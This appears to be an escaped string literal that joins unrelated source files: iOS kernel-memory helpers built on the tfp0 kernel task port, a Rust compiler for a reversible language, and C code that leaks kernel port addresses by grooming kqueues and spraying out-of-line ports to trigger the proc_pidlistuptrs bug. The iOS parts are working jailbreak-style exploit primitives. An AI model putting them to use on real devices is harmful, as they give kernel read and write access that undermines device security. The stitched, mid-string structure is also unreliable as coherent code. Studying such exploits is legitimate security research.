        return rk64_via_tfp0(kaddr);\n\
    }\n\
    if (kmem_read_port != MACH_PORT_NULL) {\n\
        return rk64_via_kmem_read_port(kaddr);\n\
    }\n\
    LOG(\"attempt to read kernel memory but no kernel memory read primitives available\");\n\
    sleep(3);\n\
    return 0;\n\
}\n\
const uint64_t kernel_addr_space_base = 0xffff000000000000;\n\
void kmemcpy(uint64_t dest, uint64_t src, uint32_t length)\n\
{\n\
    if (dest >= kernel_addr_space_base) {\n\
        // copy to kernel:\n\
        wkbuffer(dest, (void*)src, length);\n\
    } else {\n\
        // copy from kernel\n\
        rkbuffer(src, (void*)dest, length);\n\
    }\n\
}\n\
uint64_t kmem_alloc(uint64_t size)\n\
{\n\
    if (tfp0 == MACH_PORT_NULL) {\n\
        LOG(\"attempt to allocate kernel memory before any kernel memory write primitives available\");\n\
        sleep(3);\n\
        return 0;\n\
    }\n\
    kern_return_t err;\n\
    mach_vm_address_t addr = 0;\n\
    mach_vm_size_t ksize = round_page_kernel(size);\n\
    err = mach_vm_allocate(tfp0, \&addr, ksize, VM_FLAGS_ANYWHERE);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
        sleep(3);\n\
        return 0;\n\
    }\n\
    return addr;\n\
}\n\
uint64_t kmem_alloc_wired(uint64_t size)\n\
{\n\
    if (tfp0 == MACH_PORT_NULL) {\n\
        LOG(\"attempt to allocate kernel memory before any kernel memory write primitives available\");\n\
        sleep(3);\n\
        return 0;\n\
    }\n\
    kern_return_t err;\n\
    mach_vm_address_t addr = 0;\n\
    mach_vm_size_t ksize = round_page_kernel(size);\n\
    LOG(\"vm_kernel_page_size: %lx\", vm_kernel_page_size);\n\
    err = mach_vm_allocate(tfp0, \&addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
        sleep(3);\n\
        return 0;\n\
    }\n\
    LOG(\"allocated address: %llx\", addr);\n\
    addr += 0x3fff;\n\
    addr \&= ~0x3fffull;\n\
    LOG(\"address to wire: %llx\", addr);\n\
    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ | VM_PROT_WRITE);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"unable to wire kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
        sleep(3);\n\
        return 0;\n\
    }\n\
    return addr;\n\
}\n\
void kmem_free(uint64_t kaddr, uint64_t size)\n\
{\n\
    if (tfp0 == MACH_PORT_NULL) {\n\
        LOG(\"attempt to deallocate kernel memory before any kernel memory write primitives available\");\n\
        sleep(3);\n\
        return;\n\
    }\n\
    kern_return_t err;\n\
    mach_vm_size_t ksize = round_page_kernel(size);\n\
    err = mach_vm_deallocate(tfp0, kaddr, ksize);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"unable to deallocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
        sleep(3);\n\
        return;\n\
    }\n\
}\n\
void kmem_protect(uint64_t kaddr, uint32_t size, int prot)\n\
{\n\
    if (tfp0 == MACH_PORT_NULL) {\n\
        LOG(\"attempt to change protection of kernel memory before any kernel memory write primitives available\");\n\
        sleep(3);\n\
        return;\n\
    }\n\
    kern_return_t err;\n\
    err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"unable to change protection of kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
        sleep(3);\n\
        return;\n\
    }\n\
}\n\
\
use crate::syntaxtree as ST;\n\
use crate::interpreter;\n\
use interpreter::Instruction;\n\
#[derive(Default, Debug)]\n\
pub struct Code {\n\
    fwd: Vec&lt;Instruction>,\n\
    bkwd: Vec&lt;Instruction>,\n\
    f2b_links: Vec&lt;(usize, usize)>,\n\
    b2f_links: Vec&lt;(usize, usize)>\n\
}\n\
impl Code {\n\
    pub fn new() -> Code {\n\
        Default::default()\n\
    }\n\
    pub fn with_capacity(l1: usize, l2: usize) -> Code {\n\
        Code{\n\
            fwd: Vec::with_capacity(l1),\n\
            bkwd: Vec::with_capacity(l2),\n\
            f2b_links: Vec::new(),\n\
            b2f_links: Vec::new()\n\
        }\n\
    }\n\
    pub fn link_fwd2bkwd(\&mut self) {\n\
        self.f2b_links.push((self.fwd.len(), self.bkwd.len()));\n\
        // Insert dummy instruction //\n\
        self.fwd.push(Instruction::Reverse{idx: 0});\n\
    }\n\
    pub fn link_bkwd2fwd(\&mut self) {\n\
        self.b2f_links.push((self.bkwd.len(), self.fwd.len()));\n\
        // Insert dummy instruction //\n\
        self.bkwd.push(Instruction::Reverse{idx: 0});\n\
    }\n\
    pub fn push_fwd(\&mut self, x: Instruction) {\n\
        self.fwd.push(x);\n\
    }\n\
    pub fn push_bkwd(\&mut self, x: Instruction) {\n\
        self.bkwd.push(x);\n\
    }\n\
    pub fn append_fwd(\&mut self, mut instructions: Vec&lt;Instruction>) {\n\
        self.fwd.append(\&mut instructions);\n\
    }\n\
    \n\
    pub fn append_bkwd(\&mut self, instructions: Vec&lt;Instruction>) {\n\
        self.bkwd.extend(instructions.into_iter().rev());\n\
    }\n\
    pub fn fwd_len(\&mut self) -> usize {\n\
        self.fwd.len()\n\
    }\n\
    pub fn bkwd_len(\&mut self) -> usize {\n\
        self.bkwd.len()\n\
    }\n\
    pub fn extend(\&mut self, other: Code) {\n\
        let Code{fwd, bkwd, f2b_links, b2f_links} = other;\n\
        let (flen, blen) = (self.fwd.len(), self.bkwd.len());\n\
        self.fwd.extend(fwd);\n\
        self.bkwd.extend(bkwd);\n\
        for (f, b) in f2b_links.into_iter() {\n\
            self.f2b_links.push((f + flen, b + blen));\n\
        }\n\
        for (b, f) in b2f_links.into_iter() {\n\
            self.b2f_links.push((b + blen, f + flen));\n\
        }\n\
    }\n\
    pub fn finalise(code: Code) -> interpreter::Code {\n\
        let Code{mut fwd, mut bkwd, f2b_links, b2f_links} = code;\n\
        bkwd.reverse();\n\
        for (f, b) in f2b_links.into_iter() {\n\
            let b = bkwd.len() - b;\n\
            match fwd[f] {\n\
                Instruction::Reverse{idx: _} => fwd[f] = Instruction::Reverse{idx: b},\n\
                _ => panic!()\n\
            }\n\
        }\n\
        for (b, f) in b2f_links.into_iter() {\n\
            let b = bkwd.len() - b;\n\
            match bkwd[b] {\n\
                Instruction::Reverse{idx: _} => bkwd[b] = Instruction::Reverse{idx: f},\n\
                _ => panic!()\n\
            }\n\
        }\n\
        interpreter::Code{fwd, bkwd}\n\
    }\n\
}\n\
impl ST::ExpressionNode {\n\
    pub fn compile(\&self) -> Vec<Instruction> {\n\
        match \&self {\n\
            ST::ExpressionNode::FractionNode(valbox) => valbox.compile(),\n\
            ST::ExpressionNode::LookupNode(valbox) => valbox.compile(),\n\
            ST::ExpressionNode::BinopNode(valbox) => valbox.compile(),\n\
            ST::ExpressionNode::ArrayLiteralNode(valbox) => valbox.compile()\n\
        }\n\
    }\n\
}\n\
impl ST::FractionNode {\n\
    pub fn compile(\&self) -> Vec<Instruction> {\n\
        vec![Instruction::LoadConst{idx: self.const_idx}]\n\
    }\n\
}\n\
impl ST::LookupNode {\n\
    pub fn compile(\&self) -> Vec&lt;Instruction> {\n\
        let mut instructions = Vec::with_capacity(self.indices.len()+1);        \n\
        for index in self.indices.iter().rev() {\n\
            instructions.extend(index.compile());\n\
        }\n\
        instructions.push(Instruction::LoadRegister{register:self.register});\n\
        if !self.indices.is_empty() {\n\
            instructions.push(Instruction::Subscript{size: self.indices.len()});\n\
        }\n\
        instructions\n\
    }\n\
}\n\
impl ST::BinopNode {\n\
    pub fn compile(\&self) -> Vec&lt;Instruction> {\n\
        let mut ret = Vec::new();\n\
        ret.extend(self.lhs.compile());\n\
        ret.extend(self.rhs.compile());\n\
        ret.push(self.op.clone());\n\
        ret\n\
    }\n\
}\n\
impl ST::ArrayLiteralNode {\n\
    pub fn compile(\&self) -> Vec&lt;Instruction> {\n\
        let mut ret = Vec::with_capacity(self.items.len() + 1);\n\
        for item in self.items.iter().rev() {\n\
            ret.extend(item.compile());\n\
        }\n\
        ret.push(Instruction::CreateArray{size: self.items.len()});\n\
        ret\n\
    }\n\
}\n\
impl ST::StatementNode {\n\
    pub fn compile(\&self) -> Code {\n\
        match self {\n\
            ST::StatementNode::LetUnletNode(valbox) => valbox.compile(),\n\
            ST::StatementNode::RefUnrefNode(valbox) => valbox.compile(),\n\
            ST::StatementNode::IfNode(valbox) => valbox.compile(),\n\
            ST::StatementNode::ModopNode(valbox) => valbox.compile(),\n\
            ST::StatementNode::CatchNode(valbox) => valbox.compile(),\n\
            ST::StatementNode::CallNode(valbox) => valbox.compile()\n\
        }\n\
    }\n\
}\n\
impl ST::LetUnletNode {\n\
    pub fn compile(\&self) -> Code {\n\
        let mut code = Code::new();\n\
        if self.is_unlet {\n\
            code.push_fwd(Instruction::FreeRegister{register: self.register});\n\
            code.push_bkwd(Instruction::StoreRegister{register: self.register});\n\
            code.push_bkwd(Instruction::UniqueVar);\n\
            code.append_bkwd(self.rhs.compile());\n\
        } else {\n\
            code.append_fwd(self.rhs.compile());\n\
            code.push_fwd(Instruction::UniqueVar);\n\
            code.push_fwd(Instruction::StoreRegister{register: self.register});\n\
            code.push_bkwd(Instruction::FreeRegister{register: self.register});\n\
        }\n\
        code\n\
    }\n\
}\n\
impl ST::RefUnrefNode {\n\
    pub fn compile(\&self) -> Code {\n\
        let mut create_ref = self.rhs.compile();\n\
        create_ref.push(Instruction::StoreRegister{register: self.register});\n\
        let remove_ref = vec![Instruction::FreeRegister{register: self.register}];\n\
        let mut code = Code::new();\n\
        if self.is_unref{\n\
            code.append_fwd(remove_ref);\n\
            code.append_bkwd(create_ref);\n\
        } else {\n\
            code.append_fwd(create_ref);\n\
            code.append_bkwd(remove_ref);\n\
        }\n\
        code\n\
    }\n\
}\n\
impl ST::ModopNode {\n\
    pub fn compile(\&self) -> Code {\n\
        let lookup = self.lookup.compile();\n\
        let rhs = self.rhs.compile();\n\
        let bkwd_op = match self.op {\n\
            Instruction::BinopAdd => Instruction::BinopSub,\n\
            Instruction::BinopSub => Instruction::BinopAdd,\n\
            Instruction::BinopMul => Instruction::BinopDiv,\n\
            Instruction::BinopDiv => Instruction::BinopMul,\n\
            _ => unreachable!()\n\
        };\n\
        let capacity = lookup.len() + rhs.len() + 3;\n\
        let mut code = Code::with_capacity(capacity, capacity);\n\
        code.append_fwd(lookup.clone());\n\
        code.push_fwd(Instruction::DuplicateRef);\n\
        code.append_fwd(rhs.clone());\n\
        code.push_fwd(self.op.clone());\n\
        code.push_fwd(Instruction::Store);\n\
        code.push_bkwd(Instruction::Store);\n\
        code.push_bkwd(bkwd_op);\n\
        code.append_bkwd(rhs);\n\
        code.push_bkwd(Instruction::DuplicateRef);\n\
        code.append_bkwd(lookup);\n\
        \n\
        code\n\
    }\n\
}\n\
impl ST::IfNode {\n\
    pub fn compile(\&self) -> Code {\n\
        let fwd_expr = self.fwd_expr.compile();\n\
        let bkwd_expr = self.bkwd_expr.compile();\n\
        let mut if_block = Code::new();\n\
        for stmt in self.if_stmts.iter() {\n\
            if_block.extend(stmt.compile());\n\
        }\n\
        let mut else_block = Code::new();\n\
        for stmt in self.else_stmts.iter() {\n\
            else_block.extend(stmt.compile());\n\
        }\n\
        let if_bkwd_len = if_block.bkwd_len() as isize;\n\
        let else_bkwd_len = else_block.bkwd_len() as isize;\n\
        \n\
        let mut code = Code::with_capacity(\n\
            if_block.fwd_len() + else_block.fwd_len() + fwd_expr.len() + 2, \n\
            if_block.bkwd_len() + else_block.bkwd_len() + bkwd_expr.len() + 2);\n\
        \n\
        code.append_fwd(fwd_expr);\n\
        code.push_fwd(Instruction::JumpIfFalse{\n\
            delta: (if_block.fwd_len() + 1) as isize\n\
        });\n\
        code.extend(if_block);\n\
        code.push_fwd(Instruction::Jump{\n\
            delta: else_block.fwd_len() as isize\n\
        });\n\
        code.push_bkwd(Instruction::Jump{delta: if_bkwd_len});\n\
        code.extend(else_block);\n\
        code.push_bkwd(Instruction::JumpIfTrue{delta: else_bkwd_len + 1});\n\
        code.append_bkwd(bkwd_expr);\n\
        code\n\
    }\n\
}\n\
impl ST::CatchNode {\n\
    pub fn compile(\&self) -> Code {\n\
        let mut code = Code::new();\n\
        code.append_fwd(self.expr.compile());\n\
        code.push_fwd(Instruction::JumpIfFalse{delta: 1});\n\
        code.link_fwd2bkwd();\n\
        code\n\
    }\n\
}\n\
impl ST::CallNode {\n\
    pub fn compile(\&self) -> Code {\n\
        let mut code = Code::new();\n\
        for \&register in self.stolen_args.iter().rev() {\n\
            code.push_fwd(Instruction::LoadRegister{register});\n\
            code.push_fwd(Instruction::FreeRegister{register});\n\
        }\n\
        if self.is_uncall {\n\
            code.push_bkwd(Instruction::Call{idx: self.func_idx});\n\
            code.push_fwd(Instruction::Uncall{idx: self.func_idx});\n\
        } else {\n\
            for arg in self.borrow_args.iter().rev() {\n\
                code.append_fwd(arg.compile());\n\
            }\n\
            code.push_fwd(Instruction::Call{idx: self.func_idx});\n\
            code.push_bkwd(Instruction::Uncall{idx: self.func_idx});\n\
        }\n\
        for \&register in self.return_args.iter().rev() {\n\
            code.push_fwd(Instruction::StoreRegister{register});\n\
        }\n\
        code\n\
    }\n\
}\n\
impl ST::FunctionNode {\n\
    pub fn compile(\&self) -> interpreter::Function {\n\
        let mut code = Code::new();\n\
        for \&register in \&self.borrow_registers {\n\
            code.push_fwd(Instruction::StoreRegister{register});\n\
        }\n\
        for \&register in \&self.steal_registers {\n\
            code.push_fwd(Instruction::StoreRegister{register});\n\
        }\n\
        for stmt in \&self.stmts {\n\
            code.extend(stmt.compile());\n\
        }\n\
        for \&register in \&self.return_registers {\n\
            code.push_fwd(Instruction::LoadRegister{register});\n\
        }\n\
        interpreter::Function{\n\
            consts: self.consts.clone(),\n\
            code: Code::finalise(code),\n\
            num_registers: self.num_registers\n\
        }\n\
    }\n\
}\n\
impl ST::Module {\n\
    pub fn compile(\&self) -> interpreter::Module {\n\
        interpreter::Module{\n\
            main_idx: self.main_idx,\n\
            functions: self.functions.iter()\n\
                                     .map(|f| f.compile())\n\
                                     .collect()\n\
        }\n\
    }\n\
}\n\
#include &lt;stdio.h>\n\
#include &lt;stdlib.h>\n\
#include &lt;unistd.h>\n\
#include &lt;mach/mach.h>\n\
#include \"kmem.h\"\n\
#include \"koffsets.h\"\n\
#include \"kutils.h\"\n\
#include \"find_port.h\"\n\
#include \"common.h\"\n\
#include &lt;CoreFoundation/CoreFoundation.h>\n\
extern void NSLog(CFStringRef, ...);\n\
#define LOG(str, args...) do { NSLog(CFSTR(\"[*] \" str \"\n\"), ##args); } while(false)\n\
// missing headers\n\
#define KEVENT_FLAG_WORKLOOP 0x400\n\
typedef uint64_t kqueue_id_t;\n\
struct kevent_qos_s {\n\
    uint64_t ident; /* identifier for this event */\n\
    int16_t filter; /* filter for event */\n\
    uint16_t flags; /* general flags */\n\
    uint32_t qos; /* quality of service when servicing event */\n\
    uint64_t udata; /* opaque user data identifier */\n\
    uint32_t fflags; /* filter-specific flags */\n\
    uint32_t xflags; /* extra filter-specific flags */\n\
    int64_t data; /* filter-specific data */\n\
    uint64_t ext[4]; /* filter-specific extensions */\n\
};\n\
#define PRIVATE\n\
#include &lt;sys/event.h>\n\
#include &lt;sys/time.h>\n\
#include &lt;sys/types.h>\n\
struct kevent_extinfo {\n\
    struct kevent_qos_s kqext_kev;\n\
    uint64_t kqext_sdata;\n\
    int kqext_status;\n\
    int kqext_sfflags;\n\
    uint64_t kqext_reserved[2];\n\
};\n\
extern int kevent_id(uint64_t id, const struct kevent_qos_s* changelist, int nchanges, struct kevent_qos_s* eventlist, int nevents, void* data_out, size_t* data_available, unsigned int flags);\n\
int proc_list_uptrs(pid_t pid, uint64_t* buffer, uint32_t buffersize);\n\
// appends n_events user events onto this process's kevent queue\n\
static void fill_events(int n_events)\n\
{\n\
    struct kevent_qos_s events_id[] = { { .filter = EVFILT_USER,\n\
        .ident = 1,\n\
        .flags = EV_ADD,\n\
        .udata = 0x2345 } };\n\
    kqueue_id_t id = 0x1234;\n\
    for (int i = 0; i &lt; n_events; i++) {\n\
        int err = kevent_id(id, events_id, 1, NULL, 0, NULL, NULL,\n\
            KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);\n\
        if (err != 0) {\n\
            LOG(\"failed to enqueue user event\");\n\
            exit(EXIT_FAILURE);\n\
        }\n\
        events_id[0].ident++;\n\
    }\n\
}\n\
int kqueues_allocated = 0;\n\
static void prepare_kqueue()\n\
{\n\
    if (kqueues_allocated) {\n\
        return;\n\
    }\n\
    fill_events(10000);\n\
    LOG(\"prepared kqueue\");\n\
    kqueues_allocated = 1;\n\
}\n\
static uint64_t try_leak(int count)\n\
{\n\
    int buf_size = (count * 8) + 7;\n\
    char* buf = calloc(buf_size + 1, 1);\n\
    int err = proc_list_uptrs(getpid(), (void*)buf, buf_size);\n\
    if (err == -1) {\n\
        return 0;\n\
    }\n\
    uint64_t last_val = ((uint64_t*)buf)[count]; \n\
    return last_val;\n\
}\n\
struct ool_msg {\n\
    mach_msg_header_t hdr;\n\
    mach_msg_body_t body;\n\
    mach_msg_ool_ports_descriptor_t ool_ports;\n\
};\n\
static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)\n\
{\n\
    // allocate a port to send the message to\n\
    mach_port_t q = MACH_PORT_NULL;\n\
    kern_return_t err;\n\
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, \&q);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"failed to allocate port\");\n\
        exit(EXIT_FAILURE);\n\
    }\n\
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);\n\
    for (int i = 0; i &lt; count; i++) {\n\
        ports[i] = target_port;\n\
    }\n\
    struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));\n\
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);\n\
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);\n\
    msg->hdr.msgh_remote_port = q;\n\
    msg->hdr.msgh_local_port = MACH_PORT_NULL;\n\
    msg->hdr.msgh_id = 0x41414141;\n\
    msg->body.msgh_descriptor_count = 1;\n\
    msg->ool_ports.address = ports;\n\
    msg->ool_ports.count = count;\n\
    msg->ool_ports.deallocate = 0;\n\
    msg->ool_ports.disposition = disposition;\n\
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;\n\
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;\n\
    err = mach_msg(\&msg->hdr,\n\
        MACH_SEND_MSG | MACH_MSG_OPTION_NONE,\n\
        (mach_msg_size_t)sizeof(struct ool_msg),\n\
        0,\n\
        MACH_PORT_NULL,\n\
        MACH_MSG_TIMEOUT_NONE,\n\
        MACH_PORT_NULL);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"failed to send message: %s\", mach_error_string(err));\n\
        exit(EXIT_FAILURE);\n\
    }\n\
    return q;\n\
}\n\
static int uint64_t_compare(const void* a, const void* b)\n\
{\n\
    uint64_t a_val = (*(uint64_t*)a);\n\
    uint64_t b_val = (*(uint64_t*)b);\n\
    if (a_val &lt; b_val) {\n\
        return -1;\n\
    }\n\
    if (a_val == b_val) {\n\
        return 0;\n\
    }\n\
    return 1;\n\
}\n\
uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)\n\
{\n\
    prepare_kqueue();\n\
    int n_guesses = 100;\n\
    uint64_t* guesses = calloc(1, n_guesses * sizeof(uint64_t));\n\
    int valid_guesses = 0;\n\
    for (int i = 1; i &lt; n_guesses + 1; i++) {\n\
        mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);\n\
        mach_port_destroy(mach_task_self(), q);\n\
        uint64_t leaked = try_leak(i - 1);\n\
        //LOG(\"leaked %016llx\", leaked);\n\
        // a valid guess is one which looks a bit like a kernel heap pointer\n\
        // without the upper byte:\n\
        if ((leaked &lt; 0x00ffffff00000000) \&\& (leaked > 0x00ffff0000000000)) {\n\
            guesses[valid_guesses++] = leaked | 0xff00000000000000;\n\
        }\n\
    }\n\
    if (valid_guesses == 0) {\n\
        LOG(\"couldn't leak any kernel pointers\");\n\
        exit(EXIT_FAILURE);\n\
    }\n\
    // return the most frequent guess\n\
    qsort(guesses, valid_guesses, sizeof(uint64_t), uint64_t_compare);\n\
    uint64_t best_guess = guesses[0];\n\
    int best_guess_count = 1;\n\
    uint64_t current_guess = guesses[0];\n\
    int current_guess_count = 1;\n\
    for (int i = 1; i &lt; valid_guesses; i++) {\n\
        if (guesses[i] == guesses[i - 1]) {\n\
            current_guess_count++;\n\
            if (current_guess_count > best_guess_count) {\n\
                best_guess = current_guess;\n\
                best_guess_count = current_guess_count;\n\
            }\n\
        } else {\n\
            current_guess = guesses[i];\n\
            current_guess_count = 1;\n\
        }\n\
    }\n\
    free(guesses);\n\
    return best_guess;\n\
}\n\
uint64_t find_port_via_kmem_read(mach_port_name_t port)\n\
{\n\
    uint64_t task_port_addr = task_self_addr();\n\
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n\
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));\n\
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));\n\
    uint32_t port_index = port >> 8;\n\
    const int sizeof_ipc_entry_t = 0x18;\n\
    uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));\n\
    return port_addr;\n\
}\n\
uint64_t find_port_address(mach_port_t port, int disposition)\n\
{\n\
    if (have_kmem_read()) {\n\
        return find_port_via_kmem_read(port);\n\
    }\n\
    return find_port_via_proc_pidlistuptrs_bug(port, disposition);\n\
}\n\
";